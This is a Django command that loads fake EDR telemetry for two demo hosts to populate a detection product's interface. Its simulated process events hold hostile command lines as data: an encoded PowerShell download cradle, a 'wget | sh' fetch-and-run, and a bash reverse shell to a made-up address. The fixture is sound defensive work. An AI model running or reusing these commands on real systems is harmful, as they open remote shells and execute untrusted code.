"""Load fake demo telemetry so the UI and reports have something to show.

    python manage.py seed_demo           # adds hosts DEMO-WIN11-FINANCE and DEMO-LINUX-WEB
    python manage.py seed_demo --purge   # removes them again

Nothing here touches the network or any real process; events go through the normal ingest pipeline.
"""
import time

from django.core.management.base import BaseCommand

from edr.engine import pipeline
from edr.models import Host

WIN = "demo0000winfin01"
LIN = "demo0000linweb01"
C2 = "104.18.32.47"  # made-up address in a CDN range, only ever written to the database


def _start(pid, ppid, name, exe, cmd, t, user="CORP\\jlindqvist"):
    return {"type": "process_start", "ts": t, "pid": pid, "ppid": ppid, "create_time": t, "name": name, "exe": exe,
            "cmdline": cmd, "cwd": "", "username": user, "sha256": "", "exe_deleted": False, "agent": False}


def _net(pid, ct, ts, raddr, rport, lport=50000, direction="outbound", laddr="10.20.4.17"):
    return {"type": "net_connect", "ts": ts, "pid": pid, "create_time": ct, "direction": direction, "proto": "tcp",
            "laddr": laddr, "lport": lport, "raddr": raddr, "rport": rport, "status": "ESTABLISHED"}


def _mem(pid, ct, ts, regions, rwx=0, unbacked=0, pe=0):
    return {"type": "memory_scan", "ts": ts, "pid": pid, "create_time": ct,
            "summary": {"total_regions": 212, "exec_regions": 41, "rwx_regions": rwx, "unbacked_exec": unbacked,
                        "susp_path_exec": 0, "pe_in_private": pe, "private_bytes": 48_000_000, "exec_bytes": 19_400_000,
                        "flagged_regions": len(regions)}, "regions": regions}


class Command(BaseCommand):
    help = "Load or purge synthetic demo telemetry"

    def add_arguments(self, parser):
        parser.add_argument("--purge", action="store_true")

    def handle(self, *args, **opts):
        if opts["purge"]:
            n = Host.objects.filter(host_id__in=[WIN, LIN]).delete()[0]
            self.stdout.write(f"removed {n} rows")
            return
        now = time.time()
        t0 = now - 3 * 3600
        win_host = {"host_id": WIN, "hostname": "DEMO-WIN11-FINANCE", "os_name": "Windows", "os_version": "Windows-11-10.0.22631",
                    "arch": "AMD64", "ip_addresses": ["10.20.4.17"], "agent_version": "1.0.0", "is_admin": True,
                    "capabilities": {"memory_introspection": True}}
        lin_host = {"host_id": LIN, "hostname": "DEMO-LINUX-WEB", "os_name": "Linux", "os_version": "Linux-6.8-x86_64",
                    "arch": "x86_64", "ip_addresses": ["10.20.9.5"], "agent_version": "1.0.0", "is_admin": True,
                    "capabilities": {"memory_introspection": True}}
        S = "C:\\Windows\\System32\\"
        ev = [
            _start(4, 0, "System", "", "System", t0 - 900, "NT AUTHORITY\\SYSTEM"),
            _start(700, 4, "wininit.exe", S + "wininit.exe", "wininit.exe", t0 - 890, "NT AUTHORITY\\SYSTEM"),
            _start(780, 700, "services.exe", S + "services.exe", "services.exe", t0 - 880, "NT AUTHORITY\\SYSTEM"),
            _start(920, 780, "svchost.exe", S + "svchost.exe", "svchost.exe -k netsvcs -p", t0 - 870, "NT AUTHORITY\\SYSTEM"),
            _start(4120, 4, "explorer.exe", "C:\\Windows\\explorer.exe", "explorer.exe", t0 - 800),
            _start(4980, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe", t0 - 700),
            _start(5208, 4120, "WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                   "WINWORD.EXE /n \"C:\\Users\\jlindqvist\\Downloads\\Invoice_Q3_final.docm\"", now - 1500),
            _start(6112, 5208, "cmd.exe", S + "cmd.exe", "cmd.exe /c powershell.exe -nop -w hidden -enc "
                   "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", now - 1490),
            _start(6140, 6112, "powershell.exe", S + "WindowsPowerShell\\v1.0\\powershell.exe",
                   "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                   now - 1488),
            _start(7301, 4120, "svchost.exe", "C:\\Users\\Public\\svchost.exe", "svchost.exe", now - 900),
            _start(7420, 4120, "updater.exe", "C:\\Users\\jlindqvist\\AppData\\Local\\Temp\\updater.exe", "updater.exe --silent", now - 700),
            _net(4980, t0 - 700, now - 600, "142.250.74.14", 443, 51000),
            _net(6140, now - 1488, now - 1480, C2, 8443, 50211),
            _mem(6140, now - 1488, now - 1470, [
                {"start": 0x1C4A0000, "size": 0x2000, "perms": "rwx-", "kind": "private", "path": "", "protect": "PAGE_EXECUTE_READWRITE",
                 "readable": True, "writable": True, "executable": True, "rwx": True, "unbacked": True, "susp_path": False,
                 "header": "MZ-PE", "entropy": 5.91},
                {"start": 0x1C4C0000, "size": 0x1000, "perms": "r-x-", "kind": "private", "path": "", "protect": "PAGE_EXECUTE_READ",
                 "readable": True, "writable": False, "executable": True, "rwx": False, "unbacked": True, "susp_path": False,
                 "header": "", "entropy": 7.62}], rwx=1, unbacked=2, pe=1),
            _mem(7301, now - 900, now - 880, [], 0, 0, 0),
        ]
        ev += [_net(7420, now - 700, now - 690 + 60 * i, C2, 443, 52000 + i) for i in range(9)]
        pipeline.ingest({"host": win_host, "events": ev})

        L = [
            _start(1, 0, "systemd", "/usr/lib/systemd/systemd", "/sbin/init", t0 - 5000, "root"),
            _start(812, 1, "nginx", "/usr/sbin/nginx", "nginx: master process", t0 - 4900, "root"),
            _start(813, 812, "nginx", "/usr/sbin/nginx", "nginx: worker process", t0 - 4890, "www-data"),
            _start(2210, 813, "sh", "/usr/bin/dash", "sh -c wget -qO- http://203.0.113.9/x.sh | sh", now - 420, "www-data"),
            _start(2214, 2210, "bash", "/usr/bin/bash", "bash -i >& /dev/tcp/104.18.32.47/9001 0>&1", now - 418, "www-data"),
            _start(2301, 1, "kworker/u8:1", "/dev/shm/.k", "[kworker/u8:1]", now - 300, "www-data"),
            _net(2214, now - 418, now - 417, C2, 9001, 40112, laddr="10.20.9.5"),
        ]
        pipeline.ingest({"host": lin_host, "events": L})
        self.stdout.write(self.style.SUCCESS("demo telemetry loaded (hosts DEMO-WIN11-FINANCE, DEMO-LINUX-WEB)"))
